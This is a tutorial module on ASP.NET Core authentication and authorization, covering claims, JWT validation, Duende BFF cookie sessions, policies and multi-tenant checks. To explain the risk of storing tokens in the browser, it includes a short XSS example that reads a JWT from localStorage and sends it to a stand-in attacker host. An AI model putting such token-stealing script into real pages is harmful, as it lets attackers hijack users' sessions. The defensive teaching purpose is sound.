# Module 9: Authentication, Authorization & Identity Architecture

If there is one area where developers guess, copy-paste from StackOverflow, and accidentally create massive security holes, it is Authentication and Authorization. ASP.NET Core has an incredibly powerful, flexible, and robust security system, but it requires understanding the core concepts: **Claims, Identities, Principals, and Modern Architecture Patterns.**

---

## 1. Authentication vs. Authorization

Let's clear this up immediately because developers mix them up constantly:

*   **Authentication (AuthN):** "Who are you?" (Identity verification)
    *   *Example:* Checking a username and password, validating a cryptographic JWT signature, verifying an encrypted session cookie.
*   **Authorization (AuthZ):** "Are you allowed to do this?" (Permissions)
    *   *Example:* Can you view this document? Are you an Administrator? Do you have clearance for Tenant `3fa85f64`?

> **Analogy — The Nightclub:**  
> **Authentication** is the bouncer at the front door checking your ID. He verifies you are who you say you are and that your ID is authentic.  
> **Authorization** is the VIP room attendant. He knows who you are (you got past the front door), but he checks his list to see if you have the *permission* to enter the VIP area.

---

## 2. The Claims-Based Identity Model

In older frameworks, your identity was usually just a Username and a Role (e.g., `User.IsInRole("Admin")`). Modern ASP.NET Core uses **Claims-Based Identity**.

### What is a Claim?
A Claim is a **statement about the user**. It is a key-value pair:
*   "My Name is Alice"
*   "My Email is alice@normora.com"
*   "My Role is TenantAdmin"
*   "My ExternalUserId is usr_9812"
*   "My TenantId is 3fa85f64"

### The Hierarchy
1.  **Claim:** A single fact (`Type = "Email", Value = "alice@normora.com"`).
2.  **ClaimsIdentity:** A collection of Claims representing a single credential mechanism (like a Driver's License or a Passport).
3.  **ClaimsPrincipal:** The actual `User` object in ASP.NET Core (`HttpContext.User`). A Principal can hold *multiple* Identities (e.g., you can carry a Driver's License *and* a Corporate Passport simultaneously).

When a user authenticates, ASP.NET Core builds a `ClaimsPrincipal` and attaches it to `HttpContext.User`:

```csharp
// How to read claims in a controller or service:
var userId = HttpContext.User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
var email = HttpContext.User.FindFirst(ClaimTypes.Email)?.Value;
var tenantId = HttpContext.User.FindFirst("tenant_id")?.Value;
```

---

## 3. Stateless JWT Bearer Authentication (The NextEvent Approach)

**JSON Web Tokens (JWT)** are the standard for securing REST APIs across mobile and server-to-server systems. Instead of storing a session on the server (which requires memory and sticky sessions), the server gives the client a cryptographically signed token containing their Claims. The client sends this token in the `Authorization: Bearer <token>` header of every request.

### The Flow
1. User sends credentials (email/password) to `/api/login`.
2. Server verifies them in the database.
3. Server generates a JWT containing claims (UserId, Role, OrgId) and **cryptographically signs it** with a secret key.
4. Server returns the JWT to the client.
5. Client sends `Authorization: Bearer <token>` on future requests.
6. Server validates the signature and expiration. If valid, it extracts the claims and materializes the `ClaimsPrincipal`.

### 🏗️ Real-World: NextEvent's JWT Configuration

NextEvent uses standard JWT Bearer authentication. Notice how it validates the token:

```csharp
// From NextEvent's API/Extensions/IdentityServiceExtensions.cs
public static IServiceCollection AddIdentityServices(
    this IServiceCollection services, 
    IConfiguration config)
{
    var tokenKey = config["TokenKey"] 
        ?? throw new InvalidOperationException("TokenKey missing in configuration.");
    var issuer = config["Jwt:Issuer"];
    var audience = config["Jwt:Audience"];

    services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
        .AddJwtBearer(opt =>
        {
            opt.TokenValidationParameters = new TokenValidationParameters
            {
                ValidateIssuerSigningKey = true, // Must have a valid signature
                IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(tokenKey)),
                
                ValidateIssuer = true,           // Must come from our trusted auth server
                ValidIssuer = issuer,
                
                ValidateAudience = true,         // Must be meant for our client application
                ValidAudience = audience,
                
                ValidateLifetime = true,         // Token must not be expired
                ClockSkew = TimeSpan.Zero        // Eliminate the default 5-minute grace period!
            };
        });

    return services;
}
```

When a request arrives, the `app.UseAuthentication()` middleware reads the `Authorization` header, executes these validation rules, and if successful, populates `HttpContext.User`.

---

## 4. BFF and Cookie Authentication (The Normora Approach)

While stateless JWTs work well for mobile apps, **storing JWTs in a browser (e.g., in `localStorage` or `sessionStorage`) is a massive security hazard for Single Page Applications (SPAs).**

### ⚠️ The Attack Vector: Cross-Site Scripting (XSS) Token Theft
If your Angular or React frontend imports a single compromised third-party npm package, an attacker can execute injected JavaScript:
```javascript
// Malicious script executed via XSS:
const token = localStorage.getItem("jwt_token");
fetch("https://attacker.evil.com/steal?token=" + encodeURIComponent(token));
```
Because JavaScript can read `localStorage`, the attacker steals the user's JWT and impersonates them from anywhere in the world until token expiration.

### 🛡️ The Modern Solution: Duende BFF with Encrypted HttpOnly Cookies

In **Normora**, the architecture eliminates this vulnerability by implementing the **Backend-For-Frontend (BFF) Pattern** using **Duende BFF**:

```
[ Angular Browser SPA ]                   [ Normora.Api (BFF Host) ]             [ Keycloak IAM ]
          │                                           │                                │
          ├── 1. Click "Login" ──────────────────────▶│── 2. OIDC AuthCode + PKCE ────▶│
          │                                           │                                │ (User logs in)
          │                                           │◀── 3. Returns Tokens (JWT) ────┘
          │                                           │
          │                                           │ Encrypts Tokens in Server Session
          │                                           │ Generates SameSite=Strict Cookie
          │◀── 4. Set-Cookie: normora-bff=enc_sess; ──┘
          │       HttpOnly; Secure; SameSite=Strict
          │
          ├── 5. API Request (Cookie sent automatically)
          │      Header: X-CSRF: 1 ──────────────────▶│ (BFF Middleware decrypts session,
          │                                           │  extracts Keycloak JWT in-memory,
          │                                           │  validates CSRF, populates Claims)
          │◀── 6. Returns API Data ───────────────────┘
```

### Why the BFF Architecture is Impervious to Token Theft:
1.  **`HttpOnly` Cookies:** The browser cookie cannot be accessed by any JavaScript (`document.cookie` returns empty). Even in the event of an XSS vulnerability, the attacker **cannot steal the token**.
2.  **Tokens Never Touch the Browser:** Keycloak access tokens and refresh tokens are stored exclusively on the server in encrypted session storage (`AddEntityFrameworkServerSideSessions<SessionDbContext>`).
3.  **Anti-Forgery Defense:** Duende BFF automatically checks for an `X-CSRF: 1` header on all mutation requests (`POST`, `PUT`, `DELETE`), completely neutralizing Cross-Site Request Forgery (CSRF).

### Normora's BFF Configuration:

```csharp
// From Normora's Program.cs & IdentityServiceExtensions.cs

// 1. Register BFF services with server-side session management
builder.Services.AddBff()
    .AddEntityFrameworkServerSideSessions<SessionDbContext>();

// 2. Configure Cookie Authentication as the default scheme for browser interactions
builder.Services.AddAuthentication(options =>
{
    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = OpenIdConnectDefaults.AuthenticationScheme;
})
.AddCookie(CookieAuthenticationDefaults.AuthenticationScheme, options =>
{
    options.Cookie.Name = "__Host-normora-bff";
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.HttpOnly = true;
})
.AddOpenIdConnect(OpenIdConnectDefaults.AuthenticationScheme, options =>
{
    options.Authority = configuration["Keycloak:Authority"];
    options.ClientId = configuration["Keycloak:ClientId"];
    options.ClientSecret = configuration["Keycloak:ClientSecret"];
    options.ResponseType = OpenIdConnectResponseType.Code;
    options.ResponseMode = OpenIdConnectResponseMode.Query;
    options.SaveTokens = true; // Stored securely in server session, NOT browser!
});

// 3. Mount in middleware pipeline
app.UseAuthentication();
app.UseBff();  // Validates session cookies and anti-forgery tokens
app.MapBffManagementEndpoints(); // Exposes /bff/login, /bff/logout, /bff/user
app.MapControllers().AsBffApiEndpoint();
```

---

## 5. Authorization — Roles vs. Declarative Policies

Once `Authentication` knows *who* the caller is, `Authorization` determines what they can *do*.

### The Old Way: Roles
Roles are simple string categories: "Admin", "User", "Manager".

```csharp
[Authorize(Roles = "Admin")]
public IActionResult DeleteUser(int id)
```

**The Problem with Roles:** What happens when the business says, *"Managers can delete users, but only if the user belongs to their assigned department and MFA is enabled"?* A Role ("Manager") is insufficient. Your controller becomes polluted with `if (user.DepartmentId == ...)` logic.

### The Modern Way: Declarative Policies
Policies are **rules** evaluated against the user's Claims. You define the rule once centrally, and apply the policy name to endpoints.

```csharp
// Defining the policy in Program.cs (NextEvent)
services.AddAuthorization(options =>
{
    options.AddPolicy("ActiveOrganizer", policy =>
    {
        policy.RequireRole(RoleConstants.Organizer); // Must be an organizer
        policy.RequireClaim("ActiveProfile", "Organizer"); // Must have this specific claim
    });
});
```

```csharp
// Applying the policy to a controller
[Authorize(Policy = "ActiveOrganizer")]
[HttpPost]
public IActionResult CreateEvent(CreateEventDto dto)
```

If the business rule changes (e.g., "ActiveOrganizers must also have a verified phone number"), you update the Policy definition in one place. You don't touch the controllers.

---

## 6. Advanced Authorization: Resource-Based Authorization

Sometimes, a Policy isn't enough because permission depends on the **data being requested**.

**Example:** A user can edit a document, but **only if they are the author**. You cannot write a static Policy for this because the Policy doesn't know *which document* is being edited until the database is queried.

```csharp
// Example (How this looks in a MediatR handler)
public async Task<Unit> Handle(EditDocumentCommand request, CancellationToken ct)
{
    var document = await _db.Documents.FindAsync([request.Id], ct);
    
    if (document is null)
        throw new NotFoundException("Document not found.");

    // Resource-based check!
    if (document.AuthorId != _currentUser.ExternalUserId && !_currentUser.HasRole("Admin"))
    {
        throw new ForbiddenAccessException("You can only edit your own documents.");
    }
    
    // ... proceed with edit ...
}
```

---

## 7. Multi-Tenant Authorization (Normora)

Normora introduces a highly complex, real-world authorization requirement: **Multi-Tenancy**.  
A user might be an **Admin** in Tenant A, but merely a **Viewer** in Tenant B. Therefore, global roles (stored statically in the identity token) do not work.

### How Normora Solves It
Normora delays authorization until `TenantResolutionMiddleware` resolves the active workspace context:

1. **AuthN Middleware:** Authenticates identity ("This is user Alice").
2. **Tenant Middleware:** Reads `X-Tenant-Id: 3fa85f64` and queries `ITenantResolutionService` to resolve Alice's active role and departmental clearances for that specific tenant.
3. **Scoped Context:** Stores resolved scope in `ITenantContext`.
4. **Custom Authorize Attribute:** Controllers apply `[RequireTenant(TenantRoles.Admin)]`:

```csharp
// From Normora's Tenants Module Controllers
[ApiController]
[Route("api/tenants/{tenantId:guid}/departments")]
[RequireTenant(TenantRoles.Admin)] // Custom attribute checking ITenantContext.TenantRole
public class DepartmentsController : ControllerBase
{
    [HttpPost]
    public async Task<IActionResult> CreateDepartment(...)
}
```

---

## 8. Abstractions: `ICurrentUser` / `ICurrentUserService`

**Never access `HttpContext.User` directly in your Application or Domain layers.** It tightly couples your business logic to the ASP.NET Core web framework. Instead, create an abstraction in `Shared` and inject it.

### NextEvent Implementation:
```csharp
// From NextEvent's CurrentUserService.cs
public class CurrentUserService(IHttpContextAccessor httpContextAccessor) : ICurrentUserService
{
    public string? GetCurrentUserId()
    {
        var user = httpContextAccessor.HttpContext?.User;
        if (user?.Identity?.IsAuthenticated != true) return null;

        return user.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    }
    
    public bool HasRole(string role)
    {
        return httpContextAccessor.HttpContext?.User?.IsInRole(role) == true;
    }
}
```

### Normora Implementation:
```csharp
// From Normora.Shared/Interfaces/ICurrentUser.cs
public interface ICurrentUser
{
    string? ExternalUserId { get; }
    string? Email { get; }
    bool IsAuthenticated { get; }
}
```

Now, your MediatR handlers can inject `ICurrentUser` and safely access user identity without knowing anything about HTTP, JWTs, or Cookies — keeping business logic 100% testable and framework-agnostic.

---

## 9. Best Practices Summary

| Practice | Why |
|---|---|
| **Use JWTs for Server-to-Server or Mobile apps** | Stateless, scalable, standard |
| **Use Cookies + BFF for Browser SPAs (React/Angular)** | Prevents XSS token theft |
| **Set `ClockSkew = TimeSpan.Zero`** | Eliminates the default 5-minute token expiration grace period |
| **Prefer Policies over Roles** | Business rules change; Policies decouple rules from controllers |
| **Never put sensitive data in a JWT** | JWTs are base64-encoded, not encrypted; anyone can inspect claims |
| **Abstract `HttpContext.User` behind `ICurrentUser`** | Keeps business logic testable and framework-agnostic |
| **Always use `[Authorize]` globally** | Secure endpoints by default; use `[AllowAnonymous]` explicitly for login |
| **Enforce Anti-Forgery on Cookie APIs** | Protects endpoints from Cross-Site Request Forgery (CSRF) |

---
**Key Takeaways:**
1. Authentication verifies identity (JWT/Cookies); Authorization verifies permissions (Policies/Roles).
2. The Claims-Based Identity model uses key-value pairs (Claims) to describe users.
3. JWTs are stateless but vulnerable to XSS in browsers. BFF with Cookies is the modern enterprise standard for SPAs (Normora).
4. Policies are superior to Roles because they encapsulate complex rules centrally.
5. Resource-based and Tenant-based authorization require evaluating rules *after* fetching data or resolving context.

**Next up:** In [Module 10](10_Module_10_Architecture_Tests_and_Resilience.md), we explore **Architectural Fitness Functions, Resiliency & Production Engineering** — how to write automated architecture tests, configure health checks, and run zero-downtime database migrations.
